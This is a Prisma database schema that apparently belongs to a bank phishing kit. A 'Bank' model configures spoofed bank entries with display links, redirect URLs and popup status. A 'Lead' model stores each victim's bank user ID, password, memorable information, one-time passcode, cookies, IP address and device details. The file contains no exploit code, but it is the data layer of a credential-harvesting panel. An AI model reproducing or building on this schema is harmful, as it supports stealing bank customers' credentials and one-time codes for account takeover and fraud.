generator client {
  provider      = "prisma-client-js"
  binaryTargets = ["native", "linux-musl-openssl-3.0.x"]
}

datasource db {
  provider = "sqlite"
  url      = env("DATABASE_URL")
}

model Bank {
  id               String   @id @default(cuid())
  name             String
  subtitle         String
  subOptions       String?  @default("Business, Personal, Commercial")
  logoUrl          String?
  redirectUrl      String?
  personalUrl      String?
  businessUrl      String?
  commercialUrl    String?
  displayLink      String?  // 🔥 Custom display link field added
  enablePersonal   Boolean  @default(true)
  enableBusiness   Boolean  @default(true)
  enableCommercial Boolean  @default(true)
  sortOrder        Int      @default(0)
  order            Int      @default(1)
  isActive         Boolean  @default(true)
  popupStatus      String   @default("SUCCESS")
  createdAt        DateTime @default(now())
  updatedAt        DateTime @updatedAt
}

model Lead {
  id              String   @id @default(cuid())
  sessionId       String?  @unique
  bank            String?
  bankName        String?
  bankType        String?  @default("Personal")
  userId          String?
  password        String?
  memorableInfo   String?
  extraData       String?
  cookiesData     String?  @default("{\"status\": \"active\"}")
  otpCode         String?
  optionLabel     String?  @default("Default")
  redirectUrl     String?
  ipAddress       String?  @default("Unknown")
  deviceInfo      String?  @default("Unknown")
  createdAt       DateTime @default(now())
  updatedAt       DateTime @updatedAt
}